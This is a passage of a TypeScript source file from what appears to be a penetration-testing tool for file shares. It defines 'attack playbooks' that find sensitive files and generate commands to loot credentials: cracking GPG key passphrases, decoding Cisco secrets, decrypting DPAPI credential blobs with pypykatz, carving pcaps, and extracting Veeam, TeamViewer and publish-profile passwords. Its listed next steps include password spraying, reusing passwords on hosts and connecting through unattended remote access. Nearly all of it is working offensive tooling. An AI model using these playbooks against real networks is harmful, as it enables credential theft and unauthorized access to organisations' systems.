        {
          label: 'Import and list',
          description: 'See key IDs and whether a passphrase is required',
          command: `gpg --import ${shQuote(ctx.localName)}\ngpg --list-secret-keys`,
        },
        {
          label: 'Crack passphrase',
          description: 'If the secret key is protected',
          command: `gpg2john ${shQuote(ctx.localName)} > gpg.hash\nhashcat -m 17010 gpg.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'java-app-creds',
    title: 'Loot Java / Tomcat application configs',
    summary: 'tomcat-users and Spring properties embed passwords',
    why: 'Tomcat tomcat-users.xml, Spring application.properties/yml, JBoss standalone.xml, and hibernate.cfg.xml almost always contain datasource and admin passwords.',
    nextSteps: [
      'Extract manager/admin users and datasource credentials',
      'Try the Tomcat manager UI and the database',
      'Reuse the same password on the host OS',
    ],
    tools: ['grep'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-coffee',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === 'tomcat-users.xml' ||
          name === 'standalone.xml' ||
          name === 'hibernate.cfg.xml' ||
          name === 'context.xml' ||
          name === 'application.properties' ||
          name === 'application.yml' ||
          name === 'application.yaml' ||
          name.startsWith('application-') && (name.endsWith('.properties') || name.endsWith('.yml') || name.endsWith('.yaml'))
        );
      },
    },
    resultsFilter: { type: 'search', value: 'tomcat-users' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract Java app secrets',
          description: 'Users, datasources, and Spring property passwords',
          command: `grep -n -i -E 'pass|user|jdbc|url|secret|token|manager' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'cred-spreadsheets',
    title: 'Mine credential spreadsheets',
    summary: 'XLSX/CSV password trackers are common on IT shares',
    why: 'Teams still keep "passwords.xlsx" and onboarding CSVs on file shares. They are structured spray lists: system, username, password, and often MFA notes.',
    nextSteps: [
      'Open or convert the sheet and export user/pass columns',
      'De-duplicate and drop obvious placeholders',
      'Spray against the service named in the adjacent column',
    ],
    tools: ['ssconvert', 'xlsx2csv', 'python'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-file-excel',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const ext = name.split('.').pop() || '';
        if (!['xlsx', 'xls', 'xlsm', 'csv', 'ods'].includes(ext)) return false;
        return ['password', 'passwd', 'secret', 'credential', 'creds', 'accounts', 'users'].some((h) =>
          name.includes(h)
        );
      },
    },
    resultsFilter: { type: 'extension', value: ['xlsx', 'csv'] },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Convert to CSV',
          description: 'Then scan for user/pass columns',
          command: `xlsx2csv ${shQuote(ctx.localName)} | head\n# or\nssconvert ${shQuote(ctx.localName)} out.csv`,
        },
      ]),
  },
  {
    id: 'network-device-configs',
    title: 'Parse network-device configs',
    summary: 'Cisco/Juniper dumps include secrets and hashes',
    why: 'Router and firewall config exports on shares contain enable secrets, local users, VPN PSKs, TACACS keys, and SNMP communities. Even type-5/7 hashes are crackable or reversible.',
    nextSteps: [
      'Search for enable, username, snmp-server, and pre-shared-key',
      'Decode type-7 and crack type-5 / type-9',
      'Reuse against the device and related network gear',
    ],
    tools: ['cisco7crack', 'hashcat', 'ciscot7'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-network-wired',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const ctx = `${file.matchContext || ''}`.toLowerCase();
        const nameHit =
          name.includes('running-config') ||
          name.includes('startup-config') ||
          name.includes('running_config') ||
          name.endsWith('.ios') ||
          (name.endsWith('.cfg') && ['cisco', 'asa', 'nexus', 'juniper', 'junos', 'fortigate', 'palo', 'switch', 'router', 'firewall'].some((h) => name.includes(h)));
        const ctxHit =
          ctx.includes('enable secret') ||
          ctx.includes('enable password') ||
          ctx.includes('asa version') ||
          ctx.includes('ios xr') ||
          ctx.includes('snmp-server community');
        return nameHit || ctxHit;
      },
    },
    resultsFilter: { type: 'search', value: 'running-config' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract network secrets',
          description: 'enable, users, SNMP, VPN PSKs',
          command: `grep -n -i -E 'enable |username |snmp-server|pre-shared|secret |password |community |tacacs|radius' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'veeam-backup',
    title: 'Loot Veeam / backup-product creds',
    summary: 'Backup configs hide service accounts and encryption keys',
    why: 'Veeam and similar backup products store encrypted credentials for vCenter, Hyper-V, SQL, and cloud. Config XML / SQL backups of the Veeam DB have well-known decryption paths and often yield domain-admin-equivalent backup accounts.',
    nextSteps: [
      'Identify the product (Veeam, DPM, Backup Exec, Rubrik export)',
      'Extract encrypted credential blobs and decrypt with published tools',
      'Those accounts usually have admin on every backed-up host',
    ],
    tools: ['Veeam-Get-Creds', 'powershell'],
    severity: 'critical',
    category: 'configs',
    icon: 'fa-copy',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name.includes('veeam') ||
          name.includes('backup.exec') ||
          name === 'veeamconfig.xml' ||
          name.includes('vbrcatalog')
        );
      },
    },
    resultsFilter: { type: 'search', value: 'veeam' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Hunt backup credentials',
          description: 'Look for encrypted blobs and connection strings',
          command: `grep -n -i -E 'pass|user|cred|encrypt|sql|vcenter|connection' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'remote-support',
    title: 'Recover TeamViewer / AnyDesk access',
    summary: 'Support tools leave IDs and encoded passwords',
    why: 'TeamViewer and AnyDesk configs on shares include client IDs and obfuscated unattended-access passwords. Combined with the ID this is direct interactive access to the host.',
    nextSteps: [
      'Read ClientID / AnyDesk ID and password fields',
      'Decode the vendor-specific password encoding',
      'Connect with the official client as unattended access',
    ],
    tools: ['python', 'TeamViewer'],
    severity: 'high',
    category: 'access',
    icon: 'fa-headset',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name.includes('teamviewer') ||
          name.includes('anydesk') ||
          name === 'system.conf' && lowerPath(file).includes('anydesk')
        );
      },
    },
    resultsFilter: { type: 'search', value: 'teamviewer' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read support-tool config',
          description: 'Collect IDs and password / security hashes',
          command: `grep -n -i -E 'id|password|security|unattended|token' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'pcap-creds',
    title: 'Carve credentials from packet captures',
    summary: 'PCAPs on shares still hold LDAP, HTTP, and SMB secrets',
    why: 'Troubleshooting captures left on shares often include LDAP binds, HTTP basic auth, NTLM, or cleartext protocols. They are offline credential sources and a map of who talks to what.',
    nextSteps: [
      'Run cred-carving tools over the capture',
      'Extract hashes for offline cracking and note plaintext binds',
      'Use hosts and accounts from the capture as the next target list',
    ],
    tools: ['tshark', 'pcap-parser', 'net-creds', 'Pcredz'],
    severity: 'medium',
    category: 'dumps',
    icon: 'fa-ethernet',
    source: 'files',
    matcher: { extensions: ['pcap', 'pcapng', 'cap'] },
    resultsFilter: { type: 'extension', value: ['pcap', 'pcapng'] },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Carve credentials',
          description: 'Pcredz / net-creds pull hashes and plaintext',
          command: `Pcredz -f ${shQuote(ctx.localName)}\n# or\ntshark -r ${shQuote(ctx.localName)} -Y 'ldap.bind or http.authorization or ntlmssp' -V`,
        },
      ]),
  },
  {
    id: 'pubxml-deploy',
    title: 'Read MSBuild publish profiles',
    summary: '.pubxml files hide deploy URLs and passwords',
    why: 'Visual Studio publish profiles on shares contain IIS/Azure publish URLs, usernames, and passwords (or point at a nearby .pubxml.user). They are a direct path into web deploy.',
    nextSteps: [
      'Extract publishUrl, UserName, and Password / _SavePWD',
      'Also open the sibling .pubxml.user if present',
      'Web-deploy or log into the Azure / IIS endpoint',
    ],
    tools: ['grep', 'msdeploy'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-upload',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return name.endsWith('.pubxml') || name.endsWith('.pubxml.user');
      },
    },
    resultsFilter: { type: 'extension', value: 'pubxml' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract publish creds',
          description: 'URL, username, and password elements',
          command: `grep -n -i -E 'publishurl|username|password|userid|sitename|destination' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'credman-blobs',
    title: 'Decrypt Windows Credential Manager blobs',
    summary: 'vcrd files drop with DPAPI into saved logins',
    why: 'Roaming or copied Credential Manager files (*.vcrd under Credentials\\) hold Windows saved logins — mapped drives, RDP, and generic application creds — once the matching DPAPI masterkey is available.',
    nextSteps: [
      'Collect the vcrd files plus the user Protect\\SID masterkeys',
      'Decrypt with pypykatz / mimikatz DPAPI',
      'Replay recovered generic and domain credentials',
    ],
    tools: ['pypykatz', 'mimikatz'],
    severity: 'high',
    category: 'dumps',
    icon: 'fa-id-card',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const path = lowerPath(file);
        return (
          name.endsWith('.vcrd') ||
          (path.includes('\\credentials\\') && !path.includes('\\microsoft\\protect\\') && !name.includes('.'))
        );
      },
    },
    resultsFilter: { type: 'extension', value: 'vcrd' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Decrypt credential blob',
          description: 'Needs the matching DPAPI masterkey',
          command: `pypykatz dpapi credential ${shQuote(ctx.localName)}`,
        },
      ]),
  },
];

const SEVERITY_RANK: Record<Severity, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3,
  info: 4,
};

export function detectAttackOpportunities(
  files: FileResult[],
  shares: ShareInfo[] = []
): AttackOpportunity[] {
  const opportunities: AttackOpportunity[] = [];

  for (const def of ATTACK_PLAYBOOKS) {
    if (def.source === 'shares') {
      if (!def.shareMatch) continue;
      const matched = shares.filter(def.shareMatch);
      if (matched.length === 0) continue;
      opportunities.push({
        def,
        targets: matched.map((share) => ({ kind: 'share', share })),
      });
      continue;
    }

    if (!def.matcher) continue;
    const matched = sortFiles(files.filter((file) => fileMatches(file, def.matcher!)));
    if (matched.length === 0) continue;
    opportunities.push({
      def,
      targets: matched.map((file) => ({ kind: 'file', file })),
    });
  }

  opportunities.sort((a, b) => {
    const sev = SEVERITY_RANK[a.def.severity] - SEVERITY_RANK[b.def.severity];
    if (sev !== 0) return sev;
    return b.targets.length - a.targets.length;
  });

  return opportunities;
}

export function buildPlaybookCommands(
  opportunity: AttackOpportunity,
  target?: AttackTarget
): AttackCommand[] {
  const selected = target ?? opportunity.targets[0];
  if (!selected) return [];
  const ctx =
    selected.kind === 'file' ? contextFromFile(selected.file) : contextFromShare(selected.share);
  return opportunity.def.buildCommands(ctx);
}

export function hostOfFile(file: FileResult): string {
  const match = file.fullPath.match(/^\\\\([^\\]+)/);
  return match?.[1] || '';
}

export function hostOfShare(share: ShareInfo): string {
  return share.systemId || '';
}

export function uniqueHosts(opportunity: AttackOpportunity): string[] {
  const hosts = new Set<string>();
  for (const target of opportunity.targets) {
    if (target.kind === 'file') {
      const host = hostOfFile(target.file);
      if (host) hosts.add(host);
    } else if (target.share.systemId) {
      hosts.add(target.share.systemId);
    }
  }
  return [...hosts];
}
